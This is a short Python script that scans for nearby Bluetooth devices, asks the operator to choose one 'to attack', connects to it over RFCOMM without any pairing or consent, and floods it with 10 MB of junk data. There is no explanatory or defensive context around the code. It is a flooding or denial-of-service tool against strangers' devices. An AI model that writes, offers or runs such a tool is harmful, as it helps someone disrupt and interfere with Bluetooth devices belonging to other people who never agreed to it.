import bluetooth
import time
import signal
import sys

def scan_devices():
    print("Scanning for nearby Bluetooth devices...")
    nearby_devices = bluetooth.discover_devices(lookup_names=True)
    return nearby_devices

def connect_to_devices(devices):
    connected_devices = []
    for addr, name in devices:
        try:
            print(f"Connecting to {name} ({addr})...")
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((addr, 1))
            connected_devices.append((sock, name))
            print(f"Connected to {name} ({addr})")
        except bluetooth.BluetoothError as e:
            print(f"Failed to connect to {name} ({addr}): {e}")
    return connected_devices

def send_large_data(connected_devices):
    for sock, name in connected_devices:
        try:
            print(f"Sending large data to {name}...")
            large_data = b'A' * 1024 * 1024 * 10  # 10 MB of data
            sock.send(large_data)
            print(f"Sent large data to {name}")
        except bluetooth.BluetoothError as e:
            print(f"Failed to send data to {name}: {e}")
        finally:
            sock.close()

def signal_handler(sig, frame):
    print("\nStopping Bluetooth scanning...")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    while True:
        devices = scan_devices()
        if devices:
            print("Available Bluetooth devices:")
            for i, (addr, name) in enumerate(devices):
                print(f"{i+1}. {name} ({addr})")

            choice = input("Enter the number of the device you want to attack (or 'q' to quit): ")
            if choice == 'q':
                break
            try:
                selected_device = devices[int(choice) - 1]
                connected_devices = connect_to_devices([selected_device])
                send_large_data(connected_devices)
            except (ValueError, IndexError):
                print("Invalid choice. Please try again.")
        else:
            print("No Bluetooth devices found.")

if __name__ == "__main__":
    main()
